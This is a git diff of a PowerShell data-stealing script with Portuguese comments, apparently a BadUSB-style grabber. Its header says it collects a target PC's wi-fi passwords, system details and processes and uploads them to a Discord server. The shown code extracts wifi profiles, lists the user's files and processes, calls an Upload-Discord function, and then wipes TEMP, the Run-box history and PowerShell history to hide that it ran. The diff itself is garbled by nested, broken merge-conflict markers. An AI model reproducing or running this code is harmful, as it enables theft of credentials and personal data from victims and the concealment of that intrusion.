@@ -18,17 +18,23 @@
 #__________________________________________________________________________________________________________________________________________________________#
 #                                                                                                                                                          #                                                                                 
 <<<<<<< HEAD
+<<<<<<< HEAD
 #   Descrição:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
 #        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
 #        Detalhes como: palavra passe de redes wi-fi, especificações do computador, todos os processos em execução...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
 #        Todas as informações adquiridas serão formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
 #        Esse arquivo é enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
 =======
+=======
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 #   Descricao:                                                                                                          |   ███████▀▀▀░░░░░░░▀▀▀███████   |#
 #        Este script permite obter detalhes sobre o PC alvo.                                                            |   ████▀░░░░░░░░░░░░░░░░░▀████   |#
 #        Detalhes como: palavra passe de redes wi-fi, especificacoes do computador, todos os processos em execucao...   |   ███│░░░░░░░░░░░░░░░░░░░│███   |#
 #        Todas as informacoes adquiridas serao formatadas de maneira organizada e enviadas para um arquivo.             |   ██▌│░░░░░░░░░░░░░░░░░░░│▐██   |#
 #        Esse arquivo e enviado para um servidor discord.                                                               |   ██░└┐░░░░░░░░░░░░░░░░░┌┘░██   |#
+<<<<<<< HEAD
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
+=======
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 #                                                                                                                       |   ██░░└┐░░░░░░░░░░░░░░░┌┘░░██   |#
 #   Sobre mim:                                                                                                          |   ██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██   |#
@@ -74,10 +80,17 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 ############################################################################################################################################################
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
 # Histórico da PowerShell
+=======
+# Reconhecimento de todos os diretorios do utilizador
+tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
+
+# Historico da PowerShell
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Reconhecimento de todos os diretorios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
@@ -219,9 +232,15 @@ $NearbyWifi="No nearby wifi networks detected"
 ############################################################################################################################################################
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Apanha informação sobre o PC
 
 # Apanha o IP / Informação da Rede
+=======
+# Apanha informacao sobre o PC
+
+# Apanha o IP / Informacao da Rede
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Apanha informacao sobre o PC
 
@@ -247,7 +266,11 @@ if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").
 ############################################################################################################################################################
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 #Apanha informações do sistema
+=======
+#Apanha informacoes do sistema
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 #Apanha informacoes do sistema
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -286,7 +309,11 @@ $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object
 ############################################################################################################################################################
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Apanha informações dos discos
+=======
+# Apanha informacoes dos discos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Apanha informacoes dos discos
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -313,7 +340,11 @@ $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$
 $process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Cria uma lista dos serviços
+=======
+# Cria uma lista dos servicos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Cria uma lista dos servicos
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -332,7 +363,11 @@ $listener = $listener | foreach-object {
 } | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Serviços
+=======
+# Servicos
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Servicos
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -345,7 +380,11 @@ $software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Unins
 $drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Placa Gráfica
+=======
+# Placa Grafica
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Placa Grafica
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -355,7 +394,11 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 ############################################################################################################################################################
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Visão Final
+=======
+# Visao Final
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Visao Final
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -620,7 +663,11 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 <#
 .NOTES 
 <<<<<<< HEAD
+<<<<<<< HEAD
 	Agora esta parte é para remover qualquer evidência que prove que o script correu
+=======
+	Agora esta parte e para remover qualquer evidencia que prove que o script correu
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 	Agora esta parte e para remover qualquer evidencia que prove que o script correu
 >>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
@@ -631,11 +678,19 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 # Delete no histórico do run box 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete no histórico da powershell
+=======
+# Delete no historico do run box 
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete no historico da powershell
+>>>>>>> db63885c95384534ccbf2570ff0df024afc5702c
 =======
 # Delete no historico do run box 
 
